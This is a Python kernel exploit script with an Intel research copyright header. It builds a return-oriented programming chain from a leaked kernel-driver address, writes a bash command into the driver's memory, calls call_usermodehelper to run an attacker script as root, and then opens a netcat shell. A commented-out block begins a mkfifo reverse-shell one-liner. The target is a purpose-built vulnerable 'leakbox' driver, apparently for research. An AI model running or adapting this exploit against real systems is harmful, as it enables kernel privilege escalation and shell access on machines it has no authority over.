#!/usr/bin/env python3.5
#
# Copyright (c) 2016, Intel Corporation
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#    * Redistributions of source code must retain the above copyright notice,
#      this list of conditions and the following disclaimer.
#    * Redistributions in binary form must reproduce the above copyright
#      notice, this list of conditions and the following disclaimer in the
#      documentation and/or other materials provided with the distribution.
#    * Neither the name of Intel Corporation nor the names of its contributors
#      may be used to endorse or promote products derived from this software
#      without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
import sys
import fcntl
import struct
import multiprocessing
from pwn import *
from unalignedrop.gadget_finder import gadget
from unalignedrop.elf_sections import section

class Adjuster(object):
    '''
    Adds its internal offset to anything it is passed. This is used to add the
    address of the leak to the address of the found gadgets so we jump the the
    place they are loaded in memory.
    '''

    def __init__(self, offset=0):
        '''
        Specify an offset to be used for adjustment
        '''
        self.offset = int(offset)

    def __call__(self, addr):
        '''
        Return the addr + the offset specified on creation
        '''
        return self.offset + int(addr)

    def add(self, add):
        self.offset += int(add)
        return self.offset

def kallsyms_lookup_name(sym_name):
    '''
    Reads /proc/kallsyms to find the address of the requested symbol
    '''
    with open('/proc/kallsyms', 'rb') as i:
        for l in i.read().decode('utf-8').split('\n'):
            if sym_name == l.split()[-1]:
                return int(l.split()[0], 16)

def leaked(start_leaker, search_for):
    '''
    Look though dmesg for the leaked address
    '''
    leaker = process(start_leaker)
    leak = ''
    search_for = search_for.split('/')[-1]
    while not isinstance(leak, int):
        leak = leaker.recv().decode('utf-8').replace('\r', '')
        leak = [l for l in leak.split('\n') if 'vboxdrv:' in l and search_for in l]
        if len(leak) < 1:
            continue
        leak = leak[-1].split()
        if len(leak) < 3:
            continue
        leak = int(leak[-2], 16)
    return leak, leaker

def write4(rop, gadget_file, adjuster, string_location, string):
    '''
    Writes 4 bytes to an address in memory. If its not four bytes the rop chain
    will get all messed up.
    '''
    # pop rax; ret;
    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
    # The four byte string
    rop.raw(string)
    # pop rdi; ret;
    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
    # set rdi
    rop.raw(string_location)
    # mov rax, (rdi)
    rop.raw(adjuster(gadget('mov %rax, (%rdi); ret;', gadget_file)))
    return rop

def write_string(rop, gadget_file, adjuster, string_location, string):
    i = 0
    while len(string) > 0:
        write = '\x00\x00\x00\x00'
        if len(string) > 3:
            write = string[:4]
            string = string[4:]
        else:
            write = string + '\x00'*(4 - len(string))
            string = ''
        write = write.encode('ascii')
        rop = write4(rop, gadget_file, adjuster, string_location + i, write)
        i += 4
    return rop, i

def build(leak, gadget_file, sled_length, script_location):
    '''
    Constructs the rop chain
    '''
    # Load the target binary
    with open(gadget_file, 'rb') as i:
        binary = ELF.from_bytes(i.read(), vma=leak)
    # Create the ROP stack
    rop = ROP(binary, should_load_gadgets=False)

    # Adjust found instructions by adding the leaked address
    adjuster = Adjuster(leak)

    # Put a nice lil ret seld on der
    for i in range(0, sled_length):
        # ret;
        rop.raw(adjuster(gadget('ret;', gadget_file)))

    # Build a string in the .bss section of the target driver
    # the .bss section starts at the address the driver was loaded
    string_location = adjuster(section('.bss', gadget_file))
    print('string_location:', hex(string_location))

    '''
    # Create the character arrays in the .bss section for VMMR0.r0
    # argv[0][0]
    rop = write4(rop, gadget_file, adjuster, string_location + 0,
            b'/bin')
    rop = write4(rop, gadget_file, adjuster, string_location + 4,
            b'/bas')
    # argv[1][0]
    rop = write4(rop, gadget_file, adjuster, string_location + 8,
            b'h\x00-c')
    # argv[2][0]
    rop = write4(rop, gadget_file, adjuster, string_location + 12,
            b'\x00rm ')
    rop = write4(rop, gadget_file, adjuster, string_location + 16,
            b'-f /')
    rop = write4(rop, gadget_file, adjuster, string_location + 20,
            b'tmp/')
    rop = write4(rop, gadget_file, adjuster, string_location + 24,
            b'f;mk')
    rop = write4(rop, gadget_file, adjuster, string_location + 28,
            b'fifo')
    rop = write4(rop, gadget_file, adjuster, string_location + 32,
            b' /tm')
    '''
    rop, i = write_string(rop, gadget_file, adjuster, string_location,
            '/bin/bash\x00' + script_location + '\x00')

    # Build the array of pointers to the character arrays (argv)
    # argv[0]
    rop = write4(rop, gadget_file, adjuster, string_location + i,
            string_location)
    # argv[1]
    rop = write4(rop, gadget_file, adjuster, string_location + i + 8,
            string_location + 10)
    # argv[2]
    rop = write4(rop, gadget_file, adjuster, string_location + i + 16,
            0x0)

    # Setup registers to call call_userspacehelper
    # We found out how to do this by compiling a simple kernel module, saving
    # the output of the objdump and then adding the call_usermodehelper
    # function call into the init with the array for character arrays (argv) on
    # defined within that function. Looking at the diff between the too
    # assembled versions of the function we found out what values needed to be
    # in what registers.
    #   rax - address of the first character array in argv (argv[0])
    #   rdi - same as rax
    #   rsi - address of the array of character pointers (argv)
    #   rcx - 1 I'm not sure what #define this corresponds to but it makes it
    #         fork and exec without waiting on it which is what we want
    #   rdx - NULL for no env

    # pop rax; ret;
    rop.raw(adjuster(gadget('pop %rax; ret;', gadget_file)))
    # set rax
    rop.raw(string_location)
    # pop rdi; ret;
    rop.raw(adjuster(gadget('pop %rdi; ret;', gadget_file)))
    # set rdi
    rop.raw(string_location)
    # pop rsi; ret;
    rop.raw(adjuster(gadget('pop %rsi; ret;', gadget_file)))
    # set rsi
    rop.raw(string_location + i)
    # pop rcx; ret;
    rop.raw(adjuster(gadget('pop %rcx; ret;', gadget_file)))
    # set rcx
    rop.raw(0x1)
    # pop rdx; ret;
    rop.raw(adjuster(gadget('pop %rdx; ret;', gadget_file)))
    # set rdx
    rop.raw(0x0)
    # Address of call_usermodehelper from /proc/kallsyms
    rop.raw(kallsyms_lookup_name('call_usermodehelper'))
    # Junk which rip will land on after the call
    rop.raw(0xbabebabe)

    # Display our completed ROP chain
    print(rop.dump())
    # Return it as bytes to be writen out
    return bytes(rop)

def create_exploit(target_binary, sled_length, leak, script_location):
    '''
    Builds the payload and writes it to the `payload` file
    '''
    exploit = build(leak, target_binary, sled_length, script_location)
    with open('payload', 'wb') as o:
        o.write(exploit)
    return exploit

def send_to_leakbox_module(exploit):
    '''
    Sends the exploit to the ioctl and dies a violent death (so run me in the
    thread)
    '''
    leakbox_msg = struct.pack('H', len(exploit)) + exploit
    with open('/dev/leakbox', 'wb') as fd:
        fcntl.ioctl(fd, 13371337, leakbox_msg)

def attack_kernel(target_binary, sled_length, script_location):
    '''
    Run create exploit with the address from dmesg on the vulnerable driver we
    created
    '''
    # Get the leaked address from dmesg
    leak, leaker = leaked(['dmesg', '--color=never'], target_binary)
    leaker.shutdown()
    print('Leaked address is', str(hex(leak)))
    # Create the exploit for that leaked address
    exploit = create_exploit(target_binary, sled_length, leak, script_location)
    # Send it to the kernel module
    print('sending payload...')
    p = multiprocessing.Process(target=send_to_leakbox_module, args=(exploit,))
    p.start()
    p.join()
    print('payload sent')
    process(['nc', 'localhost', '7331']).interactive(prompt='')

def main():
    # Set the pwntools context
    context.clear(arch='amd64', kernel='amd64')
    # Make sure we have enough args
    if len(sys.argv) < 4:
        print('Usage %s target_binary ret_sled_length script_location [leak]'.format(sys.argv[1]))
        sys.exit(1)
    # Set the common variables
    target_binary = sys.argv[1]
    sled_length = int(sys.argv[2])
    script_location = sys.argv[3]
    if len(sys.argv) == 4:
        # If there is not a leaked address then generate the payload and send it
        # through our kernel driver
        attack_kernel(target_binary, sled_length, script_location)
    else:
        # If there is a leaked address provided then just generate the paylaod
        # for that address and exit
        leak = int(sys.argv[4], 16)
        create_exploit(target_binary, sled_length, leak, script_location)

if __name__ == '__main__':
    main()
